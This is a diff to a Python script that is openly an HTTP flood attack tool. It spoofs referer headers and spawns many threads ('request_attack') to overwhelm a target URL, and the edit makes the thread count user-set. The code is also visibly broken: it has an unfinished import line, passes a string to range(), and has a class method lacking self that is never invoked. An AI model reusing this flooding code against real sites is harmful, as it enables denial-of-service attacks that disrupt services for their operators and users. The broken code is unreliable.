@@ -2,8 +2,12 @@ import urllib.request
 import threading
 import re
 import random
+import sys
+from 
 from time import sleep
 
+url=''
+threading_usages=input('How much threads > ')
 headers_referers=[]
 user_agent=[]
 headers={}
@@ -2938,6 +2942,7 @@ def reffers_append():
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 reffers_append()
 
+
 def trang():
   while True:
     sleep(10)
@@ -2947,31 +2952,17 @@ def trang():
   req=urllib.request.Request(url, headers=headers)
   thrill=urllib.request.urlopen(req)
 
+class sending_attk:
+	def trang_send():
+	  for i in range(threading_usages):
+	    get_attack=threading.Thread(target=request_attack)
+	    get_attack.start()
 
-def trang_send():
-  for i in range(10000):
-    get_attack=threading.Thread(target=request_attack)
-    get_attack.start()
-  
-  while True:
-    if threading.active_count() < 10000:
-      get_attack=threading.Thread(target=request_attack)
-      get_attack.start()
+	  while True:
+	    if threading.active_count() < threading_usages:
+	      get_attack=threading.Thread(target=request_attack)
+	      get_attack.start()
 
-def multi_attack():
-  processes=[]
-  num_processes=4
+if __name__=="__main__":
+	sending_attk
 
-  for i in range(num_processes):
-      process=multiprocessing.Process(target=send())
-      processes.append(process)
-
-  for process in processes:
-      process.start()
-
-  for process in processes:
-      process.join()
-
-multi_attack()
-  
-  
